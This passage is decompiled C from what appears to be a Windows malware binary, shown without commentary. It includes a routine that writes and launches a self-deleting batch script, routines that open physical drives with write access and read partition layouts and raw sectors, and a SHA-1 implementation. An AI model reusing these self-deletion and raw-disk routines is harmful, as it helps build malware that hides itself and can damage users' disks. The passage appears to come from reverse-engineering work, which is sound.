  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  hFile = CreateFileA(local_310,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    pcVar2 = s__Repeat_del___s__if_exist___s__g_00423660;
    do {
      pcVar4 = pcVar2;
      pcVar2 = pcVar4 + 1;
    } while (*pcVar4 != '\0');
    pcVar2 = aCStack_20c;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    pcVar3 = local_310;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    pcVar2 = pcVar3 + (int)pcVar2 * 3 + (int)&stack0xfffffce8 * -4 + (int)(pcVar4 + -0x42395e);
    pcVar4 = (char *)operator_new((uint)pcVar2);
    _memset(pcVar4,0,(size_t)pcVar2);
    _sprintf_s(pcVar4,(size_t)pcVar2,s__Repeat_del___s__if_exist___s__g_00423660,aCStack_20c,
               aCStack_20c,acStack_108,local_310);
    pcVar2 = pcVar4;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    WriteFile(hFile,pcVar4,(int)pcVar2 - (int)(pcVar4 + 1),&local_314,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    ShellExecuteA((HWND)0x0,&DAT_0041de08,local_310,(LPCSTR)0x0,(LPCSTR)0x0,0);
    if (pcVar4 != (char *)0x0) {
      _free(pcVar4);
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_314);
  return;
}



void __cdecl FUN_00403d90(uint param_1,LPVOID param_2)

{
  HANDLE unaff_ESI;
  DWORD local_18;
  _OVERLAPPED local_14;
  
  local_14.Internal = 0;
  local_14.InternalHigh = 0;
  local_14.hEvent = (HANDLE)0x0;
  local_18 = 0;
  if (unaff_ESI != (HANDLE)0xffffffff) {
    local_14.u = (_union_518)((ulonglong)param_1 * 0x200);
    ReadFile(unaff_ESI,param_2,0x400,&local_18,&local_14);
  }
  return;
}



void FUN_00403df0(void)

{
  int iVar1;
  int unaff_EBX;
  undefined4 *puVar2;
  undefined4 *puVar3;
  DWORD dwDesiredAccess;
  wchar_t local_40;
  undefined4 local_3e;
  undefined4 local_3a;
  undefined4 local_36;
  undefined4 local_32;
  undefined2 local_2e;
  undefined4 local_2c [9];
  undefined4 local_8;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_40;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_0041de10;
  puVar3 = local_2c;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_8 = 0;
  local_40 = L'\0';
  local_3e = 0;
  local_3a = 0;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  if (-1 < unaff_EBX) {
    __itow_s(unaff_EBX,&local_40,10,10);
    _wcscat_s((wchar_t *)local_2c,0x14,&local_40);
    if (unaff_EBX == 0) {
      dwDesiredAccess = 0x80000000;
    }
    else {
      dwDesiredAccess = 0xc0000000;
    }
    CreateFileW((LPCWSTR)local_2c,dwDesiredAccess,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_40);
  return;
}



void __thiscall FUN_00403ea0(void *this,short param_1)

{
  HANDLE hDevice;
  BOOL BVar1;
  undefined4 *unaff_EBX;
  DWORD DStack_438;
  undefined4 local_434;
  undefined2 local_430;
  wchar_t local_42c;
  undefined4 local_42a;
  undefined4 local_426;
  undefined4 local_422;
  undefined4 local_41e;
  undefined4 local_41a;
  undefined4 local_416;
  undefined4 local_412;
  undefined4 local_40e;
  undefined4 local_40a;
  undefined2 local_406;
  undefined auStack_404 [8];
  undefined4 uStack_3fc;
  uint uStack_3f4;
  uint uStack_3f0;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&DStack_438;
  local_434._0_2_ = (short)DAT_0041de34;
  local_434 = CONCAT22((short)((uint)DAT_0041de34 >> 0x10),(short)local_434 + param_1);
  local_42a = 0;
  local_426 = 0;
  local_422 = 0;
  local_41e = 0;
  local_41a = 0;
  local_416 = 0;
  local_412 = 0;
  local_40e = 0;
  local_40a = 0;
  local_406 = 0;
  local_430 = DAT_0041de38;
  local_42c = L'\0';
  FUN_004040f0(CONCAT22((short)((uint)this >> 0x10),DAT_0041de38),&local_42c,u______s_0041de3c);
  hDevice = CreateFileW(&local_42c,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,auStack_404,0x400,&DStack_438,
                            (LPOVERLAPPED)0x0);
    if (BVar1 != 0) {
      __alldiv(uStack_3f4,uStack_3f0,0x200,0);
      *unaff_EBX = uStack_3fc;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&DStack_438);
  return;
}



undefined4 __cdecl FUN_00403fb0(HANDLE param_1)

{
  int iVar1;
  uint uVar2;
  void *lpOutBuffer;
  BOOL BVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  undefined8 uVar8;
  undefined4 uStack_10;
  DWORD DStack_c;
  uint uStack_8;
  
  Sleep(100);
  iVar6 = 0;
  iVar7 = 0;
  uVar5 = 0;
  uStack_10 = 0;
  uStack_8 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    lpOutBuffer = operator_new(0xc00);
    BVar3 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,lpOutBuffer,0xc00,&DStack_c,
                            (LPOVERLAPPED)0x0);
    if (BVar3 != 0) {
      iVar1 = *(int *)((int)lpOutBuffer + 0x3c);
      uVar4 = uStack_8;
      if ((-1 < iVar1) && ((0 < iVar1 || (*(uint *)((int)lpOutBuffer + 0x38) != 0)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x40);
        iVar6 = *(int *)((int)lpOutBuffer + 0x44);
        uVar4 = *(uint *)((int)lpOutBuffer + 0x38);
        iVar7 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0xcc);
      uVar2 = *(uint *)((int)lpOutBuffer + 200);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0xd0);
        iVar6 = *(int *)((int)lpOutBuffer + 0xd4);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x15c);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x158);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x160);
        iVar6 = *(int *)((int)lpOutBuffer + 0x164);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x1ec);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x1e8);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x1f0);
        iVar6 = *(int *)((int)lpOutBuffer + 500);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      uVar8 = __alldiv(uVar5 + uVar4,iVar6 + iVar7 + (uint)CARRY4(uVar5,uVar4),0x200,0);
      uStack_10 = (undefined4)uVar8;
    }
    if (lpOutBuffer != (void *)0x0) {
      _free(lpOutBuffer);
    }
  }
  Sleep(100);
  return uStack_10;
}



void __fastcall FUN_004040f0(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x14,param_3,&stack0x00000008);
  return;
}



undefined4 __cdecl FUN_00404110(undefined4 *param_1)

{
  short sVar1;
  HANDLE in_EAX;
  undefined4 *puVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  BOOL BVar6;
  short *psVar7;
  int *piVar8;
  int *piVar9;
  int *piVar10;
  undefined4 uVar11;
  undefined4 *puVar12;
  undefined4 *local_18;
  _OVERLAPPED local_14;
  
  uVar11 = 0;
  if (in_EAX == (HANDLE)0xffffffff) {
    return 0;
  }
  puVar2 = (undefined4 *)operator_new(0x400);
  local_18 = puVar2;
  _memset(puVar2,0,0x400);
  uVar3 = FUN_00403fb0(in_EAX);
  iVar4 = FUN_00403d90(uVar3,puVar2);
  if (iVar4 == 0) goto LAB_00404325;
  piVar10 = puVar2 + 1;
  uVar3 = 4;
  piVar8 = (int *)&DAT_0041de4c;
  piVar9 = piVar10;
  do {
    if (*piVar9 != *piVar8) goto LAB_0040418c;
    uVar3 = uVar3 - 4;
    piVar8 = piVar8 + 1;
    piVar9 = piVar9 + 1;
  } while (3 < uVar3);
  if (uVar3 == 0) {
LAB_004041f5:
    iVar5 = 0;
  }
  else {
LAB_0040418c:
    iVar4 = (uint)*(byte *)piVar9 - (uint)*(byte *)piVar8;
    puVar2 = local_18;
    if (iVar4 == 0) {
      if (uVar3 == 1) goto LAB_004041f5;
      iVar4 = (uint)*(byte *)((int)piVar9 + 1) - (uint)*(byte *)((int)piVar8 + 1);
      if (iVar4 == 0) {
        if (uVar3 == 2) goto LAB_004041f5;
        iVar4 = (uint)*(byte *)((int)piVar9 + 2) - (uint)*(byte *)((int)piVar8 + 2);
        if (iVar4 == 0) {
          if ((uVar3 == 3) ||
             (iVar4 = (uint)*(byte *)((int)piVar9 + 3) - (uint)*(byte *)((int)piVar8 + 3),
             iVar4 == 0)) goto LAB_004041f5;
        }
      }
    }
    iVar5 = 1;
    if (iVar4 < 1) {
      iVar5 = -1;
    }
  }
  uVar11 = 0;
  if (iVar5 == 0) {
    psVar7 = (short *)((int)puVar2 + 0x10e);
    do {
      sVar1 = *psVar7;
      psVar7 = psVar7 + 1;
    } while (sVar1 != 0);
    if ((int)psVar7 - (int)(puVar2 + 0x44) >> 1 == 0) goto LAB_00404225;
  }
  else {
LAB_00404225:
    local_14.Internal = 0;
    local_14.InternalHigh = 0;
    local_14.hEvent = (HANDLE)0x0;
    local_18 = (undefined4 *)0x0;
    local_14.u.s.Offset = 0x3c00;
    local_14.u.s.OffsetHigh = 0;
    BVar6 = ReadFile(in_EAX,puVar2,0x400,(LPDWORD)&local_18,&local_14);
    if (BVar6 == 0) goto LAB_00404325;
    uVar3 = 4;
    piVar9 = (int *)&DAT_0041de4c;
    do {
      if (*piVar10 != *piVar9) goto LAB_0040428e;
      uVar3 = uVar3 - 4;
      piVar9 = piVar9 + 1;
      piVar10 = piVar10 + 1;
    } while (3 < uVar3);
    if (uVar3 == 0) {
LAB_004042eb:
      iVar5 = 0;
    }
    else {
LAB_0040428e:
      iVar4 = (uint)*(byte *)piVar10 - (uint)*(byte *)piVar9;
      if (iVar4 == 0) {
        if (uVar3 == 1) goto LAB_004042eb;
        iVar4 = (uint)*(byte *)((int)piVar10 + 1) - (uint)*(byte *)((int)piVar9 + 1);
        if (iVar4 == 0) {
          if (uVar3 == 2) goto LAB_004042eb;
          iVar4 = (uint)*(byte *)((int)piVar10 + 2) - (uint)*(byte *)((int)piVar9 + 2);
          if (iVar4 == 0) {
            if ((uVar3 == 3) ||
               (iVar4 = (uint)*(byte *)((int)piVar10 + 3) - (uint)*(byte *)((int)piVar9 + 3),
               iVar4 == 0)) goto LAB_004042eb;
          }
        }
      }
      iVar5 = 1;
      if (iVar4 < 1) {
        iVar5 = -1;
      }
    }
    if (iVar5 != 0) goto LAB_00404325;
    psVar7 = (short *)((int)puVar2 + 0x10e);
    do {
      sVar1 = *psVar7;
      psVar7 = psVar7 + 1;
    } while (sVar1 != 0);
    if ((int)psVar7 - (int)(puVar2 + 0x44) >> 1 == 0) goto LAB_00404325;
  }
  puVar12 = puVar2;
  for (iVar4 = 0x8d; iVar4 != 0; iVar4 = iVar4 + -1) {
    *param_1 = *puVar12;
    puVar12 = puVar12 + 1;
    param_1 = param_1 + 1;
  }
  *(undefined2 *)param_1 = *(undefined2 *)puVar12;
  uVar11 = 1;
LAB_00404325:
  if (puVar2 != (undefined4 *)0x0) {
    _free(puVar2);
  }
  return uVar11;
}



void FUN_00404340(void)

{
  int iVar1;
  void *this;
  undefined4 *unaff_ESI;
  undefined4 local_218;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&local_218;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_218 = 0;
  GetSystemDirectoryW(&local_214,0x104);
  FUN_00403ea0(this,local_214 + L'﾿');
  iVar1 = FUN_00403df0();
  if (iVar1 == -1) {
    ___security_check_cookie_4(local_8 ^ (uint)&local_218);
    return;
  }
  FUN_00404110(unaff_ESI);
  ___security_check_cookie_4(local_8 ^ (uint)&local_218);
  return;
}



void FUN_004043f0(void)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  
  uVar1 = *(uint *)(in_EAX + 8);
  uVar3 = *(uint *)(in_EAX + 0xc);
  uVar7 = *(uint *)(in_EAX + 0x10);
  uVar5 = uVar3 >> 2 | uVar3 << 0x1e;
  uVar3 = (uVar1 >> 0x1b | uVar1 << 5) +
          ((*(uint *)(in_EAX + 0x14) ^ uVar7) & uVar3 ^ *(uint *)(in_EAX + 0x14)) +
          *(int *)(in_EAX + 0x18) + 0x5a827999 + *(int *)(in_EAX + 0x1c);
  uVar2 = *(int *)(in_EAX + 0x14) + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar1 ^ uVar7) +
          *(int *)(in_EAX + 0x20);
  uVar1 = uVar1 >> 2 | uVar1 << 0x1e;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 + 0x5a827999 +
          ((uVar5 ^ uVar1) & uVar3 ^ uVar5) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(int *)(in_EAX + 0x24);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar5 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar1) & uVar2 ^ uVar1) +
          *(int *)(in_EAX + 0x28);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar4 ^ uVar6) & uVar3 ^ uVar4) +
          *(int *)(in_EAX + 0x2c) + 0x5a827999 + uVar1;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar1 >> 0x1b | uVar1 * 0x20) + ((uVar6 ^ uVar7) & uVar2 ^ uVar6) +
          *(int *)(in_EAX + 0x30);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = uVar6 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar1 ^ uVar7) +
          *(int *)(in_EAX + 0x34);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar5 ^ uVar4) & uVar3 ^ uVar5) +
          *(int *)(in_EAX + 0x38) + 0x5a827999 + uVar7;
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar1 ^ uVar4) & uVar2 ^ uVar4) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x3c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar8 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar2 = uVar4 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar1 ^ uVar6) & uVar7 ^ uVar1) +
          *(int *)(in_EAX + 0x40);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar6 ^ uVar8) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x44) + 0x5a827999 + uVar1;
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar6 + 0x5a827999 +
          (uVar1 >> 0x1b | uVar1 * 0x20) + ((uVar8 ^ uVar5) & uVar2 ^ uVar8) +
          *(int *)(in_EAX + 0x48);
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = uVar8 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar5 ^ uVar7) & uVar1 ^ uVar5) +
          *(int *)(in_EAX + 0x4c);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar4 ^ uVar7) & uVar3 ^ uVar7) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(uint *)(in_EAX + 0x50);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar7 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar6) & uVar2 ^ uVar4) +
          *(int *)(in_EAX + 0x54);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar6 ^ uVar5) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x58);
  uVar1 = uVar6 + 0x5a827999 +
          ((uVar5 ^ uVar7) & uVar2 ^ uVar5) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar2;
  uVar2 = uVar5 + 0x5a827999 +
          ((uVar7 ^ uVar4) & uVar3 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x24) = uVar3;
  uVar3 = uVar7 + 0x5a827999 +
          ((uVar6 ^ uVar4) & uVar1 ^ uVar4) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar5 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar1 = uVar4 + 0x5a827999 +
          ((uVar6 ^ uVar5) & uVar2 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar3) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x30) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar1;
  uVar1 = uVar4 + 0x6ed9eba1 + (uVar2 ^ uVar6 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x38) = uVar2;
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar3 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x40) = uVar1;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar2 = uVar4 + 0x6ed9eba1 + (uVar6 ^ uVar8 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar7;
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x48) = uVar3;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar2 ^ uVar5 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar2;
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar1 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x50) = uVar1;
  uVar1 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x54) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = uVar4 + 0x6ed9eba1 + (uVar8 ^ uVar6 ^ uVar2) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar2 = uVar8 + 0x6ed9eba1 + (uVar6 ^ uVar5 ^ uVar1) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar7;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar7) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar2 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x24) = uVar2;
  uVar2 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar4 + 0x6ed9eba1 + (uVar6 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x30) = uVar2;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar6) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar2 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x34) = uVar2;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
